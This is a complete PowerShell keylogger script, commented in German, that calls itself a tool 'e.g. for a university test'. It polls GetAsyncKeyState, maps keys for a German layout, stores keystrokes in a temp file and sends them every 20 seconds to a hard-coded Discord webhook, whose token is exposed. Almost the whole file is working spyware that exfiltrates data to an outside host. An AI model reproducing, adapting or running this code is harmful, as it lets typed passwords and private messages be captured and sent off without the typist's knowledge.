# PowerShell Keylogger & Discord-Webhook-Sender mit Timeout (z.B. für Uni-Test)
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Keyboard
{
    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);
}
"@

$logFile = "$env:TEMP\key.log"
$hookUrl = "https://discord.com/api/webhooks/1433072215401824358/f95HWyiUinYpyysS0MA7NUuSPFs1Ute71SLQ0hEYYvebxsCoQam850qtTGwHRDbR2yg3"

# Zeitmessung beginnen
$start = Get-Date
$timeout = 120 # Sekunden

# Logger-Start an Discord melden
try {
    Invoke-RestMethod -Uri $hookUrl -Method Post -Body (@{content="[Logger] gestartet: $(Get-Date -Format o)"}|ConvertTo-Json) -ContentType "application/json"
} catch {}

function Get-KeyChar {
    param($char)
    $shift = ([Keyboard]::GetAsyncKeyState(16) -ne 0) # Shift-Key
    $caps = ([Keyboard]::GetAsyncKeyState(20) -ne 0) # CapsLock
    $altgr = ([Keyboard]::GetAsyncKeyState(165) -ne 0) # AltGr (rechte Alt-Taste)
    # Buchstaben (A-Z)
    if ($char -ge 65 -and $char -le 90) {
        if ($shift -xor $caps) {
            return [char]$char
        } else {
            return ([char]($char + 32))
        }
    }
    # Zahlen (0-9) und deren Shift-Variante
    if ($char -ge 48 -and $char -le 57) {
        if ($shift) {
            $shiftNums = @(')','!','"','#','$','%','&','/','(','=')
            return $shiftNums[$char-48]
        } else {
            return [char]$char
        }
    }
    # Leertaste
    if ($char -eq 32) { return ' ' }
    # Enter
    if ($char -eq 13) { return "\n" }
    # Tab
    if ($char -eq 9) { return "\t" }
    # Umlaute und Sonderzeichen (DE-Layout, Standardtasten)
    $deMap = @{
        186 = 'ö'; 222 = 'ä'; 192 = 'ü'; 220 = 'ß';
        188 = ','; 190 = '.'; 191 = '-'; 189 = '-'; 187 = '=';
    }
    $deShiftMap = @{
        186 = 'Ö'; 222 = 'Ä'; 192 = 'Ü'; 220 = '?';
        188 = ';'; 190 = ':'; 191 = '_'; 189 = '_'; 187 = '*';
    }
    $deAltGrMap = @{
        81 = '@'; 69 = '€'; 55 = '{'; 56 = '['; 57 = ']'; 48 = '}'; 222 = '"'; 191 = '\\'; 220 = '~';
    }
    if ($altgr -and $deAltGrMap.ContainsKey($char)) {
        return $deAltGrMap[$char]
    } elseif ($shift -and $deShiftMap.ContainsKey($char)) {
        return $deShiftMap[$char]
    } elseif ($deMap.ContainsKey($char)) {
        return $deMap[$char]
    }
    # Sonst nichts loggen
    return $null
}

while ($true) {
    $elapsed = (Get-Date) - $start
    if ($elapsed.TotalSeconds -ge $timeout) {
        break
    }
    foreach ($char in 9,13,32,48..57,65..90,186,187,188,189,190,191,192,220,222) {
        if ([Keyboard]::GetAsyncKeyState($char) -eq -32767) {
            $key = Get-KeyChar $char
            if ($key) { Add-Content -Path $logFile -Value $key }
        }
    }
    if ((Get-Date).Second % 20 -eq 0) {
        if (Test-Path $logFile) {
            $keylog = Get-Content $logFile -Raw
            if ($keylog.Trim().Length -gt 0) {
                try {
                    Invoke-RestMethod -Uri $hookUrl -Method Post -Body (@{content=$keylog}|ConvertTo-Json) -ContentType "application/json"
                } catch {}
                Clear-Content $logFile
            }
        }
        Start-Sleep -Seconds 1
    } else {
        Start-Sleep -Milliseconds 40
    }
}
if (Test-Path $logFile) {
    $keylog = Get-Content $logFile -Raw
    if ($keylog.Trim().Length -gt 0) {
        try {
            Invoke-RestMethod -Uri $hookUrl -Method Post -Body (@{content=$keylog}|ConvertTo-Json) -ContentType "application/json"
        } catch {}
        Clear-Content $logFile
    }
}
try {
    Invoke-RestMethod -Uri $hookUrl -Method Post -Body (@{content="[Logger] beendet: $(Get-Date -Format o)"}|ConvertTo-Json) -ContentType "application/json"
} catch {}
